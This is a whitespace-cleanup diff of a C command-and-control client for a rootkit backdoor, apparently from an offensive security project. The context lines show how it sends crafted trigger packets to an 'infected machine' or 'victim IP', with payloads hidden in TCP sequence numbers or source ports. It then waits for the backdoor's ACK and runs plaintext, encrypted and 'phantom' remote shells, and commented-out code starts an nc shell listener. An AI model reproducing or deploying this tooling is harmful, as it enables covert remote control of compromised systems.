@@ -23,7 +23,7 @@
 #define KYLW  "\x1B[33m"
 #define KBLU  "\x1B[34m"
 #define KMGN  "\x1B[35m"
-#define KRED  "\x1B[31m" 
+#define KRED  "\x1B[31m"
 #define RESET "\x1B[0m"
 
 
@@ -78,22 +78,22 @@ void check_ip_address_format(char* address){
 /**
  * @brief Improved version of getting local IP
  * Based on the man page: https://man7.org/linux/man-pages/man3/getifaddrs.3.html
- * 
- * @return char* 
+ *
+ * @return char*
  */
 char* getLocalIpAddress(){
     char hostbuffer[256];
     char* IPbuffer = calloc(256, sizeof(char));
     struct hostent *host_entry;
     int hostname;
-    
+
     char buf[BUFSIZ];
-    printf(">> Which network interface do you want to use?>: ");                                                                                                                                                              
+    printf(">> Which network interface do you want to use?>: ");
     fgets(buf, BUFSIZ, stdin);
     if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
-        buf[strlen(buf)-1] = '\0';   
+        buf[strlen(buf)-1] = '\0';
     }
-    
+
     struct ifaddrs *ifaddr;
     int family, s;
     char host[NI_MAXHOST];
@@ -137,7 +137,7 @@ char* getLocalIpAddress(){
                 return IPbuffer;
             }
         }
-        
+
     }
     printf("["KRED"ERROR"RESET"]""That was not a valid interface\n");
 
@@ -151,25 +151,25 @@ char* getLocalIpAddress_old(){
     char* IPbuffer = calloc(256, sizeof(char));
     struct hostent *host_entry;
     int hostname;
-  
+
     hostname = gethostname(hostbuffer, sizeof(hostbuffer));
     if(hostname==-1){
         perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostname");
         exit(1);
     }
-  
+
     host_entry = gethostbyname(hostbuffer);
     if(host_entry == NULL){
         perror("["KRED"ERROR"RESET"]""Error getting local IP: gethostbyname");
         exit(1);
     }
-  
+
     // To convert an Internet network
     // address into ASCII string
     strcpy(IPbuffer,inet_ntoa(*((struct in_addr*) host_entry->h_addr_list[0])));
-  
+
     printf("["KBLU"INFO"RESET"]""Attacker IP selected: %s\n", IPbuffer);
-  
+
     return IPbuffer;
 }
 
@@ -188,9 +188,9 @@ unsigned short crc16(const unsigned char* data_p, unsigned char length){
 /**
  * @brief Operates input in phantom shell mode.
  * Returns whether the connection should keep open (0) or not (otherwise)
- * 
- * @param buf 
- * @return int 
+ *
+ * @param buf
+ * @return int
  */
 int phantom_shell_mode(char* buf, char* local_ip, char* dest){
     int is_global_command = manage_global_command(buf, NULL, local_ip, dest);
@@ -252,9 +252,9 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
 	}
 
 
-    //printf("["KGRN"RESPONSE"RESET"] %s\n", res); 
+    //printf("["KGRN"RESPONSE"RESET"] %s\n", res);
 
-    free(request);  
+    free(request);
     return 0;
 }
 
@@ -278,7 +278,7 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
         }else{
             printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
         }
-        
+
     }else {
         //Activating listener
         char *cmd = "nc";
@@ -295,7 +295,7 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
         }
         printf("["KGRN"OK"RESET"]""Got a shell\n");
     }
-    
+
     free(local_ip);
 }*/
 
@@ -330,20 +330,20 @@ void activate_command_control_shell(char* argv){
         printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
     }
     printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
-    
+
     //Wait for rootkit ACK to ensure it's up
     rawsocket_sniff_pattern(CC_PROT_ACK);
-    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   
+    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");
 
     //Received ACK, we proceed to send command
     while(1){
-        char buf[BUFSIZ];                                                                                                                                                          
-        printf(">> client["""KRED"plaintext shell"RESET"""]>: ");                                                                                                                                                            
+        char buf[BUFSIZ];
+        printf(">> client["""KRED"plaintext shell"RESET"""]>: ");
         fgets(buf, BUFSIZ, stdin);
         if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
-            buf[strlen(buf)-1] = '\0';   
-        }                                                                                                                                                                         
-        
+            buf[strlen(buf)-1] = '\0';
+        }
+
         char msg[BUFSIZ];
 
         //Global command "EXIT". This part should be moved together with the encrypted shell
@@ -363,9 +363,9 @@ void activate_command_control_shell(char* argv){
         printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
         packet = rawsocket_sniff_pattern(CC_PROT_MSG);
         char* res = packet.payload;
-        printf("["KGRN"RESPONSE"RESET"] %s\n", res);   
+        printf("["KGRN"RESPONSE"RESET"] %s\n", res);
     }
-    
+
     free(local_ip);
 }
 
@@ -408,8 +408,8 @@ void activate_command_control_shell_encrypted(char* argv){
     }
 
     memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
-    
-    
+
+
     packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
@@ -419,7 +419,7 @@ void activate_command_control_shell_encrypted(char* argv){
     }else{
         printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
     }
-    
+
     server_run(8500);
 }
 
@@ -467,7 +467,7 @@ void hook_control_command(char* argv, int mode){
     }
 
     memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
-    
+
     packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
@@ -520,7 +520,7 @@ void phantom_shell_request(char* argv){
     }
 
     memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
-    
+
     packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
@@ -535,21 +535,21 @@ void phantom_shell_request(char* argv){
 
     //Wait for rootkit ACK to ensure it's up
     rawsocket_sniff_pattern(CC_PROT_PHANTOM_SHELL_INIT);
-    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   
-    
+    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");
+
     client_mode = CLIENT_MODE_PHANTOM_SHELL;
     //Received ACK, we proceed to send command
     int connection_terminate = 0;
     while(connection_terminate == 0){
-        char buf[BUFSIZ];  
+        char buf[BUFSIZ];
         switch(client_mode){
-			case CLIENT_MODE_LIVE_COMMAND:                                                                                                                                                        
-                printf(">> client["""KMGN"phantom shell"RESET"""]>: ");                                                                                                                                                                
+			case CLIENT_MODE_LIVE_COMMAND:
+                printf(">> client["""KMGN"phantom shell"RESET"""]>: ");
                 fgets(buf, BUFSIZ, stdin);
                 if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
                     buf[strlen(buf)-1] = '\0';
-                }                                                                                                                                                                         
-                
+                }
+
                 connection_terminate = phantom_shell_mode(buf, local_ip, argv);
                 break;
             default:
@@ -557,7 +557,7 @@ void phantom_shell_request(char* argv){
         }
 
     }
-    
+
     free(local_ip);
 }
 
@@ -567,7 +567,7 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv, int mode)
     printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
     check_ip_address_format(argv);
     printf("["KBLU"INFO"RESET"]""Crafting malicious packet stream...\n");
-    
+
     //Stream of 3 packets, 4 bytes on each if using sequence numbers for hiding the payload
     //OR stream of 6 packets, 2 bytes each
     //Decide depending on selected mode
@@ -641,7 +641,7 @@ void activate_command_control_shell_encrypted_multi_packet(char* argv, int mode)
         }
     }
     printf("["KGRN"OK"RESET"]""Packet stream successfully sent to the backdoor in completeness\n");
-    
+
     server_run(8500);
 }
 
@@ -658,7 +658,7 @@ void main(int argc, char* argv[]){
     int PATH_ARG_PROVIDED = 0;
 
     int PARAM_MODULE_ACTIVATED = 0;
-    
+
     int opt;
     char dest_address[32];
     char path_arg[512];
@@ -675,7 +675,7 @@ void main(int argc, char* argv[]){
             strcpy(dest_address, optarg);
             send_secret_packet(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
-            
+
             break;
         case 'c':
             print_welcome_message();
@@ -686,7 +686,7 @@ void main(int argc, char* argv[]){
             strcpy(dest_address, optarg);
             activate_command_control_shell(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
-            
+
             break;
         case 'e':
             print_welcome_message();
@@ -697,7 +697,7 @@ void main(int argc, char* argv[]){
             strcpy(dest_address, optarg);
             activate_command_control_shell_encrypted(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
-            
+
             break;
         case 'u':
             print_welcome_message();
@@ -708,7 +708,7 @@ void main(int argc, char* argv[]){
             strcpy(dest_address, optarg);
             hook_control_command(dest_address, 0);
             PARAM_MODULE_ACTIVATED = 1;
-            
+
             break;
         case 'a':
             print_welcome_message();
@@ -719,7 +719,7 @@ void main(int argc, char* argv[]){
             strcpy(dest_address, optarg);
             hook_control_command(dest_address, 1);
             PARAM_MODULE_ACTIVATED = 1;
-            
+
             break;
         case 'p':
             print_welcome_message();
@@ -730,7 +730,7 @@ void main(int argc, char* argv[]){
             strcpy(dest_address, optarg);
             phantom_shell_request(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
-            
+
             break;
         case 's':
             print_welcome_message();
@@ -742,10 +742,10 @@ void main(int argc, char* argv[]){
             char buf[BUFSIZ];
             int mode = -1;
             while(mode<0){
-                printf(">> Where to hide the payload? Select a number: \n\t1. SEQNUM\n\t2. SRCPORT\nOption: ");                                                                                                                                                              
+                printf(">> Where to hide the payload? Select a number: \n\t1. SEQNUM\n\t2. SRCPORT\nOption: ");
                 fgets(buf, BUFSIZ, stdin);
                 if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
-                    buf[strlen(buf)-1] = '\0';   
+                    buf[strlen(buf)-1] = '\0';
                 }
                 if(strncmp(buf, "1", 6)==0){
                     mode = CLIENT_MULTI_PACKET_TRIGGER_MODE_SEQ_NUM;
@@ -756,9 +756,9 @@ void main(int argc, char* argv[]){
 
             activate_command_control_shell_encrypted_multi_packet(dest_address, mode);
             PARAM_MODULE_ACTIVATED = 1;
-            
+
             break;
-        /*case 'u': 
+        /*case 'u':
             print_welcome_message();
             sleep(1);
             //Selecting show rootkit - Unhide mode
@@ -769,7 +769,7 @@ void main(int argc, char* argv[]){
             PARAM_MODULE_ACTIVATED = 1;
 
             break;
-        case 'i': 
+        case 'i':
             print_welcome_message();
             sleep(1);
             //Selecting hide rootkit - Invisible mode
@@ -778,8 +778,8 @@ void main(int argc, char* argv[]){
             strcpy(dest_address, optarg);
             hide_rootkit(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
-        
-        case 'e': 
+
+        case 'e':
             ENCRYPT_MODE_SEL = 1;
             strcpy(dest_address, optarg);
 
@@ -805,7 +805,7 @@ void main(int argc, char* argv[]){
             printf("["KRED"ERROR"RESET"]""Missing arguments for %c\n", optopt);
             exit(EXIT_FAILURE);
             break;
-        
+
         default:
             print_help_dialog(argv[0]);
             exit(EXIT_FAILURE);
@@ -817,5 +817,5 @@ void main(int argc, char* argv[]){
         print_help_dialog(argv[0]);
         exit(EXIT_FAILURE);
     }
-   
+
 }
